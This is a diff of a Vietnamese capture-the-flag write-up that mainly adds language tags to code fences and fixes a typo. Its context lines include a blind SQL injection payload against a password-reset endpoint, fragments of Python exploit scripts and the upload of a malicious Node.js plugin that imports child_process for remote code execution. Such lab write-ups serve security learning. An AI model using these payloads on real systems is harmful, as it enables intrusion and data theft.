@@ -24,7 +24,7 @@ tags: ['SQLi', 'SSRF', 'File Upload', 'JWT', 'RCE']
 
 Hôm nay chúng ta sẽ đến với một challenge khá thú vị.<br />
 Có 5 flag phải tìm:
-```
+```plaintext
 flag1: khi mua thành công flag
 flag2: trong source code
 flag3: order detail của user conmeo
@@ -134,7 +134,7 @@ Nếu đưa vào `'` thì sẽ báo lỗi, trong Burp cũng hiện lỗi Interna
 <br />
 Phân tích một chút, nếu sử dụng input là `hanog@hanog.com' and 1 = 0 #` thì báo User not found, còn thay thành `1 = 1` thì lại This feature is not implemented yet.<br />
 Đến đây thì khá rõ ràng rồi, mình sẽ thiết kế payload có dạng `payload = "hanog@hanog.com' and '{c}' = lower(SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables), {index}, 1)) #"`. Trong đó `{c}` sẽ thành thành bộ kí tự abcd...0123 cho hợp lí. Chi tiết như sau:
-```
+```python
 import requests
 
 burp0_url = "https://webchallenge:443/api/v2/auth/forgot-password"
@@ -175,7 +175,7 @@ Và <br />
 `payload = "hanog@hanog.com' and '{c}' = BINARY SUBSTR((SELECT flag FROM flags), {index}, 1) #"`
 <br />
 Như thế ta tìm luôn được flag số 4: `FLAG{76906e5c78c1f04???????3e4de23a77}` <br />
-Vẫn còn khai thác được, nhưng chưa biết chỗ dùng nên ta tạm dừng lại và xem xét cấc chức năng khác đã.
+Vẫn còn khai thác được, nhưng chưa biết chỗ dùng nên ta tạm dừng lại và xem xét các chức năng khác đã.
 <br />
 
 Tiếp theo, sau khi đặt mua thử 1 mặt hàng nào đó, quan sát trong Burp thì thấy gói tin.
@@ -291,7 +291,7 @@ Sau khi thử một hồi thì cũng không có gì đặc biệt cả, nhưng c
 </div>
 File trên không có gì đặc biệt cả, nhưng mình có 1 câu hỏi: "Nếu xử lý ảnh dùng `imageController` thì xử lý plugin liệu có cần `pluginController` không?" Và kết quả là thu được thật.
 <br />
-```
+```javascript
 const path = require('path');
 const fs = require('fs');
 const errorHelpers = require('../helpers/errorHelpers');
@@ -366,11 +366,12 @@ module.exports = {
 ```
 
 Như thế rút ra được một số điều quan trọng:
+
 1. Backend dùng express-fileupload, do đó request phải là multipart/form-data
 2. `if (!req.files || !req.files.plugin) {` -> field name phải là plugin
 <br />
 Đến đây thì đơn giản rồi, mình dùng code python sau:
-```
+```python
 import requests
 
 burp0_url = "https://webchallenge/api/v1/plugins"
@@ -391,7 +392,7 @@ with open(plugin_path, 'rb') as f:
 
 ```
 Trong đó plugin.js như sau:
-```
+```javascript
 const { exec } = require('child_process');
 
 module.exports = {
